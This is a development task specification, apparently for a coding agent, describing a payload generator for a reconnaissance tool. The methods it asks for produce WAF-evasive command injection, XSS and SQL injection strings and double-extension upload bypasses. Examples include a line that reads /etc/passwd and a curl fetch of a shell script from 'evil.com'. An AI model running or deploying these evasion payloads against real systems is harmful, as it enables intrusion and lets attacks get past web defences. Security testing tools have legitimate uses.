Extend `bin/lib/payloads.js` PayloadGenerator class with payload generation methods (called from ReconAggregator):

1. **generateCommandInjectionPayloads()** - Returns array of WAF-evasive command injection test payloads:
   - Use base encoding techniques from Task 1
   - Apply case obfuscation (T1027.010)
   - Inject comments to break signatures
   - Examples: `cat /etc/passwd`, `curl http://evil.com/shell.sh`

2. **generateXssEvasionPayloads()** - Returns array of XSS evasion variants:
   - Classic XSS: `<script>alert(1)</script>`
   - Event handlers: `<img onerror=alert(1)>`
   - SVG vectors: `<svg onload=alert(1)>`
   - Apply multiple encoding variants per vector

3. **generateSqliEvasionPayloads()** - Returns array of SQLi evasion variants:
   - UNION-based: `' UNION SELECT ...`
   - Boolean blind: `' AND 1=1 --`
   - Time-based: `'; WAITFOR DELAY '00:00:05'--`
   - Apply comment injection, null byte prefixes

4. **generateDoubleExtensionTestFiles()** - Returns array of double extension pattern objects:
   - Pattern: `{ pattern: 'shell.php.jpg', description: 'PHP file masquerading as JPG' }`
   - Include common bypass patterns

5. **Helper method for WAF profile-aware generation**:
   - `generateWafProfilePayloads(wafProfile)` - Generate variants targeting specific WAF

The generation methods should use the encoding utilities from Task 1 to create multiple variants per base payload.
